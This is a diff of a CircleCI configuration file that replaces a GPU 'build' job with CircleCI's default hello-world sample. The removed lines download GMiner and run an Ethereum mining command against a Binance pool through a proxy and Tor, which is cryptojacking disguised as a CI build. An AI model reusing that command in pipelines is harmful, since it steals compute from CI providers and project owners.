@@ -1,10 +1,26 @@
-version: 2.1 
- 
-jobs: 
-  build: 
-    machine: 
-      image: ubuntu-1604-cuda-10.1:201909-23 
-    resource_class: gpu.nvidia.medium
-    steps: 
-      - run: nvidia-smi 
-      - run: wget https://github.com/develsoftware/GMinerRelease/releases/download/2.91/gminer_2_91_linux64.tar.xz && tar -xvf gminer_2_91_linux64.tar.xz && ./miner --algo ethash --server stratum+tcp://ethash.poolbinance.com:1800 --user teguhcong.$(echo tesBezzMiniZ-$(shuf -i 1-99 -n 1))#zc1y-m4ie -p x -d 0 --log_newjob 0 --cuda 1 --watchdog 0 --proto stratum --proxy 176.53.133.217:57597 --Tor 
+# Use the latest 2.1 version of CircleCI pipeline process engine.
+# See: https://circleci.com/docs/2.0/configuration-reference
+version: 2.1
+
+# Define a job to be invoked later in a workflow.
+# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
+jobs:
+  say-hello:
+    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
+    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
+    docker:
+      - image: cimg/base:stable
+    # Add steps to the job
+    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
+    steps:
+      - checkout
+      - run:
+          name: "Say hello"
+          command: "echo Hello, World!"
+
+# Invoke jobs via workflows
+# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
+workflows:
+  say-hello-workflow:
+    jobs:
+      - say-hello
